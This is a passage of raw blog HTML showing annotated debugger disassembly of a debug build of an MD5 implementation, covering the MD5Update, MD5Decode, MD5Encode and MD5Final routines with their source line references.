ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A0A | B8 04000000              | mov eax,4                               |</span><br><span class="line">00BF4A0F | C1E0 00                  | shl eax,0                               |</span><br><span class="line">00BF4A12 | 8B55 08                  | mov edx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF4A15 | 890C02                   | mov dword ptr ds:[edx+eax],ecx          | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A18 | 8B45 10                  | mov eax,dword ptr ss:[ebp+10]           | md5.c:28, [ebp+10]:&amp;&quot;ALLUSERSPROFILE&#x3D;C:\\ProgramData&quot;</span><br><span class="line">00BF4A1B | 3B45 E0                  | cmp eax,dword ptr ss:[ebp-20]           |</span><br><span class="line">00BF4A1E | 72 6E                    | jb f-young3.10_c.BF4A8E                 |</span><br><span class="line">00BF4A20 | 8B45 E0                  | mov eax,dword ptr ss:[ebp-20]           | md5.c:30</span><br><span class="line">00BF4A23 | 50                       | push eax                                |</span><br><span class="line">00BF4A24 | 8B4D 0C                  | mov ecx,dword ptr ss:[ebp+C]            | [ebp+C]:&amp;&quot;G:\\Users\\HP\\source\\repos\\f-young3.10_c\\Debug\\f-young3.10_c.exe&quot;</span><br><span class="line">00BF4A27 | 51                       | push ecx                                | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A28 | 8B55 EC                  | mov edx,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF4A2B | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF4A2E | 8D4C10 18                | lea ecx,dword ptr ds:[eax+edx+18]       | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A32 | 51                       | push ecx                                | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A33 | E8 75C8FFFF              | call f-young3.10_c.BF12AD               |</span><br><span class="line">00BF4A38 | 83C4 0C                  | add esp,C                               |</span><br><span class="line">00BF4A3B | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            | md5.c:31</span><br><span class="line">00BF4A3E | 83C0 18                  | add eax,18                              |</span><br><span class="line">00BF4A41 | 50                       | push eax                                |</span><br><span class="line">00BF4A42 | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF4A45 | 83C1 08                  | add ecx,8                               | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A48 | 51                       | push ecx                                | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A49 | E8 2DC8FFFF              | call f-young3.10_c.BF127B               |</span><br><span class="line">00BF4A4E | 83C4 08                  | add esp,8                               |</span><br><span class="line">00BF4A51 | 8B45 E0                  | mov eax,dword ptr ss:[ebp-20]           | md5.c:32</span><br><span class="line">00BF4A54 | 8945 F8                  | mov dword ptr ss:[ebp-8],eax            |</span><br><span class="line">00BF4A57 | EB 09                    | jmp f-young3.10_c.BF4A62                |</span><br><span class="line">00BF4A59 | 8B45 F8                  | mov eax,dword ptr ss:[ebp-8]            |</span><br><span class="line">00BF4A5C | 83C0 40                  | add eax,40                              |</span><br><span class="line">00BF4A5F | 8945 F8                  | mov dword ptr ss:[ebp-8],eax            |</span><br><span class="line">00BF4A62 | 8B45 F8                  | mov eax,dword ptr ss:[ebp-8]            |</span><br><span class="line">00BF4A65 | 83C0 40                  | add eax,40                              |</span><br><span class="line">00BF4A68 | 3B45 10                  | cmp eax,dword ptr ss:[ebp+10]           | [ebp+10]:&amp;&quot;ALLUSERSPROFILE&#x3D;C:\\ProgramData&quot;</span><br><span class="line">00BF4A6B | 77 18                    | ja f-young3.10_c.BF4A85                 |</span><br><span class="line">00BF4A6D | 8B45 0C                  | mov eax,dword ptr ss:[ebp+C]            | md5.c:33, [ebp+C]:&amp;&quot;G:\\Users\\HP\\source\\repos\\f-young3.10_c\\Debug\\f-young3.10_c.exe&quot;</span><br><span class="line">00BF4A70 | 0345 F8                  | add eax,dword ptr ss:[ebp-8]            |</span><br><span class="line">00BF4A73 | 50                       | push eax                                |</span><br><span class="line">00BF4A74 | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF4A77 | 83C1 08                  | add ecx,8                               | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A7A | 51                       | push ecx                                | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4A7B | E8 FBC7FFFF              | call f-young3.10_c.BF127B               |</span><br><span class="line">00BF4A80 | 83C4 08                  | add esp,8                               |</span><br><span class="line">00BF4A83 | EB D4                    | jmp f-young3.10_c.BF4A59                |</span><br><span class="line">00BF4A85 | C745 EC 00000000         | mov dword ptr ss:[ebp-14],0             | md5.c:34</span><br><span class="line">00BF4A8C | EB 07                    | jmp f-young3.10_c.BF4A95                | md5.c:35</span><br><span class="line">00BF4A8E | C745 F8 00000000         | mov dword ptr ss:[ebp-8],0              | md5.c:38</span><br><span class="line">00BF4A95 | 8B45 10                  | mov eax,dword ptr ss:[ebp+10]           | md5.c:40, [ebp+10]:&amp;&quot;ALLUSERSPROFILE&#x3D;C:\\ProgramData&quot;</span><br><span class="line">00BF4A98 | 2B45 F8                  | sub eax,dword ptr ss:[ebp-8]            |</span><br><span class="line">00BF4A9B | 50                       | push eax                                |</span><br><span class="line">00BF4A9C | 8B4D 0C                  | mov ecx,dword ptr ss:[ebp+C]            | [ebp+C]:&amp;&quot;G:\\Users\\HP\\source\\repos\\f-young3.10_c\\Debug\\f-young3.10_c.exe&quot;</span><br><span class="line">00BF4A9F | 034D F8                  | add ecx,dword ptr ss:[ebp-8]            |</span><br><span class="line">00BF4AA2 | 51                       | push ecx                                | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4AA3 | 8B55 EC                  | mov edx,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF4AA6 | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF4AA9 | 8D4C10 18                | lea ecx,dword ptr ds:[eax+edx+18]       | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4AAD | 51                       | push ecx                                | ecx:&quot;]59baI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBnVfIqTRdJS1eZNHmB19CD19983268403aI0fC8RslXg6HXaKAUa6kpvcAXszvTcxYP8jmS9sBn983268403&quot;</span><br><span class="line">00BF4AAE | E8 FAC7FFFF              | call f-young3.10_c.BF12AD               |</span><br><span class="line">00BF4AB3 | 83C4 0C                  | add esp,C                               |</span><br><span class="line">00BF4AB6 | 5F                       | pop edi                                 | md5.c:41</span><br><span class="line">00BF4AB7 | 5E                       | pop esi                                 |</span><br><span class="line">00BF4AB8 | 5B                       | pop ebx                                 |</span><br><span class="line">00BF4AB9 | 81C4 E4000000            | add esp,E4                              |</span><br><span class="line">00BF4ABF | 3BEC                     | cmp ebp,esp                             |</span><br><span class="line">00BF4AC1 | E8 7EC7FFFF              | call f-young3.10_c.BF1244               |</span><br><span class="line">00BF4AC6 | 8BE5                     | mov esp,ebp                             |</span><br><span class="line">00BF4AC8 | 5D                       | pop ebp                                 |</span><br><span class="line">00BF4AC9 | C3                       | ret                                     |</span><br></pre></td></tr></table></figure><p><code>void MD5Decode(unsigned int *output, unsigned char *input, unsigned int len)：</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">00BF2E80 | 55                       | push ebp                                | md5.c:67</span><br><span class="line">00BF2E81 | 8BEC                     | mov ebp,esp                             |</span><br><span class="line">00BF2E83 | 81EC D8000000            | sub esp,D8                              |</span><br><span class="line">00BF2E89 | 53                       | push ebx                                |</span><br><span class="line">00BF2E8A | 56                       | push esi                                |</span><br><span class="line">00BF2E8B | 57                       | push edi                                |</span><br><span class="line">00BF2E8C | 8DBD 28FFFFFF            | lea edi,dword ptr ss:[ebp-D8]           |</span><br><span class="line">00BF2E92 | B9 36000000              | mov ecx,36                              | 36:&#39;6&#39;</span><br><span class="line">00BF2E97 | B8 CCCCCCCC              | mov eax,CCCCCCCC                        |</span><br><span class="line">00BF2E9C | F3:AB                    | rep stosd                               |</span><br><span class="line">00BF2E9E | B9 0DF0BF00              | mov ecx,f-young3.10_c.BFF00D            | md5.c:15732480</span><br><span class="line">00BF2EA3 | E8 92E3FFFF              | call f-young3.10_c.BF123A               |</span><br><span class="line">00BF2EA8 | C745 F8 00000000         | mov dword ptr ss:[ebp-8],0              | md5.c:68</span><br><span class="line">00BF2EAF | C745 EC 00000000         | mov dword ptr ss:[ebp-14],0             |</span><br><span class="line">00BF2EB6 | 8B45 EC                  | mov eax,dword ptr ss:[ebp-14]           | md5.c:69</span><br><span class="line">00BF2EB9 | 3B45 10                  | cmp eax,dword ptr ss:[ebp+10]           |</span><br><span class="line">00BF2EBC | 73 53                    | jae f-young3.10_c.BF2F11                |</span><br><span class="line">00BF2EBE | 8B45 0C                  | mov eax,dword ptr ss:[ebp+C]            | md5.c:71</span><br><span class="line">00BF2EC1 | 0345 EC                  | add eax,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF2EC4 | 0FB608                   | movzx ecx,byte ptr ds:[eax]             |</span><br><span class="line">00BF2EC7 | 8B55 0C                  | mov edx,dword ptr ss:[ebp+C]            |</span><br><span class="line">00BF2ECA | 0355 EC                  | add edx,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF2ECD | 0FB642 01                | movzx eax,byte ptr ds:[edx+1]           |</span><br><span class="line">00BF2ED1 | C1E0 08                  | shl eax,8                               |</span><br><span class="line">00BF2ED4 | 0BC8                     | or ecx,eax                              |</span><br><span class="line">00BF2ED6 | 8B55 0C                  | mov edx,dword ptr ss:[ebp+C]            |</span><br><span class="line">00BF2ED9 | 0355 EC                  | add edx,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF2EDC | 0FB642 02                | movzx eax,byte ptr ds:[edx+2]           |</span><br><span class="line">00BF2EE0 | C1E0 10                  | shl eax,10                              |</span><br><span class="line">00BF2EE3 | 0BC8                     | or ecx,eax                              |</span><br><span class="line">00BF2EE5 | 8B55 0C                  | mov edx,dword ptr ss:[ebp+C]            |</span><br><span class="line">00BF2EE8 | 0355 EC                  | add edx,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF2EEB | 0FB642 03                | movzx eax,byte ptr ds:[edx+3]           |</span><br><span class="line">00BF2EEF | C1E0 18                  | shl eax,18                              |</span><br><span class="line">00BF2EF2 | 0BC8                     | or ecx,eax                              |</span><br><span class="line">00BF2EF4 | 8B55 F8                  | mov edx,dword ptr ss:[ebp-8]            |</span><br><span class="line">00BF2EF7 | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF2EFA | 890C90                   | mov dword ptr ds:[eax+edx*4],ecx        |</span><br><span class="line">00BF2EFD | 8B45 F8                  | mov eax,dword ptr ss:[ebp-8]            | md5.c:75</span><br><span class="line">00BF2F00 | 83C0 01                  | add eax,1                               |</span><br><span class="line">00BF2F03 | 8945 F8                  | mov dword ptr ss:[ebp-8],eax            |</span><br><span class="line">00BF2F06 | 8B45 EC                  | mov eax,dword ptr ss:[ebp-14]           | md5.c:76</span><br><span class="line">00BF2F09 | 83C0 04                  | add eax,4                               |</span><br><span class="line">00BF2F0C | 8945 EC                  | mov dword ptr ss:[ebp-14],eax           |</span><br><span class="line">00BF2F0F | EB A5                    | jmp f-young3.10_c.BF2EB6                | md5.c:77</span><br><span class="line">00BF2F11 | 5F                       | pop edi                                 | md5.c:78</span><br><span class="line">00BF2F12 | 5E                       | pop esi                                 |</span><br><span class="line">00BF2F13 | 5B                       | pop ebx                                 |</span><br><span class="line">00BF2F14 | 81C4 D8000000            | add esp,D8                              |</span><br><span class="line">00BF2F1A | 3BEC                     | cmp ebp,esp                             |</span><br><span class="line">00BF2F1C | E8 23E3FFFF              | call f-young3.10_c.BF1244               |</span><br><span class="line">00BF2F21 | 8BE5                     | mov esp,ebp                             |</span><br><span class="line">00BF2F23 | 5D                       | pop ebp                                 |</span><br><span class="line">00BF2F24 | C3                       | ret                                     |</span><br></pre></td></tr></table></figure><p><code>void MD5Encode(unsigned char *output, unsigned int *input, unsigned int len)</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">00BF2F50 | 55                       | push ebp                                | md5.c:54</span><br><span class="line">00BF2F51 | 8BEC                     | mov ebp,esp                             |</span><br><span class="line">00BF2F53 | 81EC D8000000            | sub esp,D8                              |</span><br><span class="line">00BF2F59 | 53                       | push ebx                                |</span><br><span class="line">00BF2F5A | 56                       | push esi                                |</span><br><span class="line">00BF2F5B | 57                       | push edi                                |</span><br><span class="line">00BF2F5C | 8DBD 28FFFFFF            | lea edi,dword ptr ss:[ebp-D8]           |</span><br><span class="line">00BF2F62 | B9 36000000              | mov ecx,36                              | 36:&#39;6&#39;</span><br><span class="line">00BF2F67 | B8 CCCCCCCC              | mov eax,CCCCCCCC                        |</span><br><span class="line">00BF2F6C | F3:AB                    | rep stosd                               |</span><br><span class="line">00BF2F6E | B9 0DF0BF00              | mov ecx,f-young3.10_c.BFF00D            | md5.c:15732480</span><br><span class="line">00BF2F73 | E8 C2E2FFFF              | call f-young3.10_c.BF123A               |</span><br><span class="line">00BF2F78 | C745 F8 00000000         | mov dword ptr ss:[ebp-8],0              | md5.c:55</span><br><span class="line">00BF2F7F | C745 EC 00000000         | mov dword ptr ss:[ebp-14],0             |</span><br><span class="line">00BF2F86 | 8B45 EC                  | mov eax,dword ptr ss:[ebp-14]           | md5.c:56</span><br><span class="line">00BF2F89 | 3B45 10                  | cmp eax,dword ptr ss:[ebp+10]           | [ebp+10]:__enc$textbss$end+384</span><br><span class="line">00BF2F8C | 73 7F                    | jae f-young3.10_c.BF300D                |</span><br><span class="line">00BF2F8E | 8B45 F8                  | mov eax,dword ptr ss:[ebp-8]            | md5.c:58</span><br><span class="line">00BF2F91 | 8B4D 0C                  | mov ecx,dword ptr ss:[ebp+C]            |</span><br><span class="line">00BF2F94 | 8B1481                   | mov edx,dword ptr ds:[ecx+eax*4]        |</span><br><span class="line">00BF2F97 | 81E2 FF000000            | and edx,FF                              |</span><br><span class="line">00BF2F9D | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF2FA0 | 0345 EC                  | add eax,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF2FA3 | 8810                     | mov byte ptr ds:[eax],dl                |</span><br><span class="line">00BF2FA5 | 8B45 F8                  | mov eax,dword ptr ss:[ebp-8]            | md5.c:59</span><br><span class="line">00BF2FA8 | 8B4D 0C                  | mov ecx,dword ptr ss:[ebp+C]            |</span><br><span class="line">00BF2FAB | 8B1481                   | mov edx,dword ptr ds:[ecx+eax*4]        |</span><br><span class="line">00BF2FAE | C1EA 08                  | shr edx,8                               |</span><br><span class="line">00BF2FB1 | 81E2 FF000000            | and edx,FF                              |</span><br><span class="line">00BF2FB7 | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF2FBA | 0345 EC                  | add eax,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF2FBD | 8850 01                  | mov byte ptr ds:[eax+1],dl              |</span><br><span class="line">00BF2FC0 | 8B45 F8                  | mov eax,dword ptr ss:[ebp-8]            | md5.c:60</span><br><span class="line">00BF2FC3 | 8B4D 0C                  | mov ecx,dword ptr ss:[ebp+C]            |</span><br><span class="line">00BF2FC6 | 8B1481                   | mov edx,dword ptr ds:[ecx+eax*4]        |</span><br><span class="line">00BF2FC9 | C1EA 10                  | shr edx,10                              |</span><br><span class="line">00BF2FCC | 81E2 FF000000            | and edx,FF                              |</span><br><span class="line">00BF2FD2 | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF2FD5 | 0345 EC                  | add eax,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF2FD8 | 8850 02                  | mov byte ptr ds:[eax+2],dl              |</span><br><span class="line">00BF2FDB | 8B45 F8                  | mov eax,dword ptr ss:[ebp-8]            | md5.c:61</span><br><span class="line">00BF2FDE | 8B4D 0C                  | mov ecx,dword ptr ss:[ebp+C]            |</span><br><span class="line">00BF2FE1 | 8B1481                   | mov edx,dword ptr ds:[ecx+eax*4]        |</span><br><span class="line">00BF2FE4 | C1EA 18                  | shr edx,18                              |</span><br><span class="line">00BF2FE7 | 81E2 FF000000            | and edx,FF                              |</span><br><span class="line">00BF2FED | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]            |</span><br><span class="line">00BF2FF0 | 0345 EC                  | add eax,dword ptr ss:[ebp-14]           |</span><br><span class="line">00BF2FF3 | 8850 03                  | mov byte ptr ds:[eax+3],dl              |</span><br><span class="line">00BF2FF6 | 8B45 F8                  | mov eax,dword ptr ss:[ebp-8]            | md5.c:62</span><br><span class="line">00BF2FF9 | 83C0 01                  | add eax,1                               |</span><br><span class="line">00BF2FFC | 8945 F8                  | mov dword ptr ss:[ebp-8],eax            |</span><br><span class="line">00BF2FFF | 8B45 EC                  | mov eax,dword ptr ss:[ebp-14]           | md5.c:63</span><br><span class="line">00BF3002 | 83C0 04                  | add eax,4                               |</span><br><span class="line">00BF3005 | 8945 EC                  | mov dword ptr ss:[ebp-14],eax           |</span><br><span class="line">00BF3008 | E9 79FFFFFF              | jmp f-young3.10_c.BF2F86                | md5.c:64</span><br><span class="line">00BF300D | 5F                       | pop edi                                 | md5.c:65</span><br><span class="line">00BF300E | 5E                       | pop esi                                 |</span><br><span class="line">00BF300F | 5B                       | pop ebx                                 |</span><br><span class="line">00BF3010 | 81C4 D8000000            | add esp,D8                              |</span><br><span class="line">00BF3016 | 3BEC                     | cmp ebp,esp                             |</span><br><span class="line">00BF3018 | E8 27E2FFFF              | call f-young3.10_c.BF1244               |</span><br><span class="line">00BF301D | 8BE5                     | mov esp,ebp                             |</span><br><span class="line">00BF301F | 5D                       | pop ebp                                 |</span><br><span class="line">00BF3020 | C3                       | ret                                     |</span><br></pre></td></tr></table></figure><p><code>MD5Final(MD5_CTX *context, unsigned char digest[16])：</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">00BF3060 | 55                       | push ebp                                                 | md5.c:43</span><br><span class="line">00BF3061 | 8BEC                     | mov ebp,esp                                              |</span><br><span class="line">00BF3063 | 81EC F0000000            | sub esp,F0                                               |</span><br><span class="line">00BF3069 | 53                       | push ebx                                                 |</span><br><span class="line">00BF306A | 56                       | push esi                                                 |</span><br><span class="line">00BF306B | 57                       | push edi                                                 |</span><br><span class="line">00BF306C | 8DBD 10FFFFFF            | lea edi,dword ptr ss:[ebp-F0]                            |</span><br><span class="line">00BF3072 | B9 3C000000              | mov ecx,3C                                               | 3C:&#39;&lt;&#39;</span><br><span class="line">00BF3077 | B8 CCCCCCCC              | mov eax,CCCCCCCC                                         |</span><br><span class="line">00BF307C | F3:AB                    | rep stosd                                                |</span><br><span class="line">00BF307E | A1 54D0BF00              | mov eax,dword ptr ds:[&lt;___security_cookie&gt;]              |</span><br><span class="line">00BF3083 | 33C5                     | xor eax,ebp                                              |</span><br><span class="line">00BF3085 | 8945 FC                  | mov dword ptr ss:[ebp-4],eax                             |</span><br><span class="line">00BF3088 | B9 0DF0BF00              | mov ecx,f-young3.10_c.BFF00D                             | md5.c:15732480</span><br><span class="line">00BF308D | E8 A8E1FFFF              | call f-young3.10_c.BF123A                                |</span><br><span class="line">00BF3092 | C745 F4 00000000         | mov dword ptr ss:[ebp-C],0                               | md5.c:44</span><br><span class="line">00BF3099 | C745 E8 00000000         | mov dword ptr ss:[ebp-18],0                              |</span><br><span class="line">00BF30A0 | B8 04000000              | mov eax,4                                                | md5.c:46</span><br><span class="line">00BF30A5 | 6BC8 00                  | imul ecx,eax,0                                           |</span><br><span class="line">00BF30A8 | 8B55 08                  | mov edx,dword ptr ss:[ebp+8]                             |</span><br><span class="line">00BF30AB | 8B040A                   | mov eax,dword ptr ds:[edx+ecx]                           |</span><br><span class="line">00BF30AE | C1E8 03                  | shr eax,3                                                |</span><br><span class="line">00BF30B1 | 83E0 3F                  | and eax,3F                                               |</span><br><span class="line">00BF30B4 | 8945 F4                  | mov dword ptr ss:[ebp-C],eax                             |</span><br><span class="line">00BF30B7 | 837D F4 38               | cmp dword ptr ss:[ebp-C],38                              | md5.c:47, 38:&#39;8&#39;</span><br><span class="line">00BF30BB | 73 10                    | jae f-young3.10_c.BF30CD                                 |</span><br><span class="line">00BF30BD | B8 38000000              | mov eax,38                                               | 38:&#39;8&#39;</span><br><span class="line">00BF30C2 | 2B45 F4                  | sub eax,dword ptr ss:[ebp-C]                             |</span><br><span class="line">00BF30C5 | 8985 10FFFFFF            | mov dword ptr ss:[ebp-F0],eax                            |</span><br><span class="line">00BF30CB | EB 0E                    | jmp f-young3.10_c.BF30DB                                 |</span><br><span class="line">00BF30CD | B9 78000000              | mov ecx,78                                               | 78:&#39;x&#39;</span><br><span class="line">00BF30D2 | 2B4D F4                  | sub ecx,dword ptr ss:[ebp-C]                             |</span><br><span class="line">00BF30D5 | 898D 10FFFFFF            | mov dword ptr ss:[ebp-F0],ecx                            |</span><br><span class="line">00BF30DB | 8B95 10FFFFFF            | mov edx,dword ptr ss:[ebp-F0]                            |</span><br><span class="line">00BF30E1 | 8955 E8                  | mov dword ptr ss:[ebp-18],edx                            |</span><br><span class="line">00BF30E4 | 6A 08                    | push 8                                                   | md5.c:48</span><br><span class="line">00BF30E6 | 8B45 08                  | mov eax,dword ptr ss:[ebp+8]                             |</span><br><span class="line">00BF30E9 | 50                       | push eax                                                 |</span><br><span class="line">00BF30EA | 8D4D D8                  | lea ecx,dword ptr ss:[ebp-28]                            |</span><br><span class="line">00BF30ED | 51                       | push ecx                                                 |</span><br><span class="line">00BF30EE | E8 ACE0FFFF              | call f-young3.10_c.BF119F                                |</span><br><span class="line">00BF30F3 | 83C4 0C                  | add esp,C                                                |</span><br><span class="line">00BF30F6 | 8B45 E8                  | mov eax,dword ptr ss:[ebp-18]                            | md5.c:49</span><br><span class="line">00BF30F9 | 50                       | push eax                                                 |</span><br><span class="line">00BF30FA | 68 00D0BF00              | push &lt;f-young3.10_c._PADDING&gt;                            |</span><br><span class="line">00BF30FF | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]                             |</span><br><span class="line">00BF3102 | 51                       | push ecx                                                 |</span><br><span class="line">00BF3103 | E8 1EE1FFFF              | call f-young3.10_c.BF1226                                |</span><br><span class="line">00BF3108 | 83C4 0C                  | add esp,C                                                |</span><br><span class="line">00BF310B | 6A 08                    | push 8                                                   | md5.c:50</span><br><span class="line">00BF310D | 8D45 D8                  | lea eax,dword ptr ss:[ebp-28]                            |</span><br><span class="line">00BF3110 | 50                       | push eax                                                 |</span><br><span class="line">00BF3111 | 8B4D 08                  | mov ecx,dword ptr ss:[ebp+8]                             |</span><br><span class="line">00BF3114 | 51                       | push ecx                                                 |</span><br><span class="line">00BF3115 | E8 0CE1FFFF              | call f-young3.10_c.BF1226                                |</span><br><span class="line">00BF311A | 83C4 0C                  | add esp,C                                                |</span><br><span class="line">00BF311D | 6A 10                    | push 10                                                  | md5.c:51</span><br><span 